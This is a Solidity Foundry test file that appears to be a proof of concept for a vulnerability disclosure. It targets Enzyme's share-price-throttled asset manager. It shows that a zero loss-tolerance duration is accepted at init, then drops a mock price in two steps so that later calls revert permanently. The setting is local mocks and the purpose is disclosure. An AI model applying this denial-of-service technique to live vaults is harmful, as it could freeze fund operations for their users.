// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.19;
import "forge-std/Test.sol";
import "../src/SharePriceThrottledAssetManagerLib.sol";
import "../src/Mocks.sol";

contract EnzymeThrottleDoSPoC is Test {
    SharePriceThrottledAssetManagerLib public manager;
    MockFundValueCalculator public calc;
    address public OWNER = address(this);
    address public VAULT = address(0xBEEF);
    address public SHUTDOWNER = address(0xDEAD);

    function setUp() public {
        calc = new MockFundValueCalculator(1e18);
        manager = new SharePriceThrottledAssetManagerLib(calc);
    }

    function test_1_Init_AcceptsDurationZero_NoValidation() public {
        manager.init(OWNER, VAULT, uint64(2e17), 0, SHUTDOWNER);
        assertEq(manager.getLossTolerancePeriodDuration(), 0);
    }

    function test_2_FullCallPath_PermanentDoS() public {
        manager.init(OWNER, VAULT, uint64(2e17), 0, SHUTDOWNER);
        calc.setPrice(1e18);
        PriceManipulator m1 = new PriceManipulator(calc, 9e17);
        SharePriceThrottledAssetManagerLib.Call[] memory calls = new SharePriceThrottledAssetManagerLib.Call[](1);
        calls[0] = SharePriceThrottledAssetManagerLib.Call({target: address(m1), data: abi.encodeWithSignature("execute()")});
        manager.executeCalls(calls);
        
        PriceManipulator m2 = new PriceManipulator(calc, 8e17);
        calls[0] = SharePriceThrottledAssetManagerLib.Call({target: address(m2), data: abi.encodeWithSignature("execute()")});
        vm.expectRevert();
        manager.executeCalls(calls);
    }
}
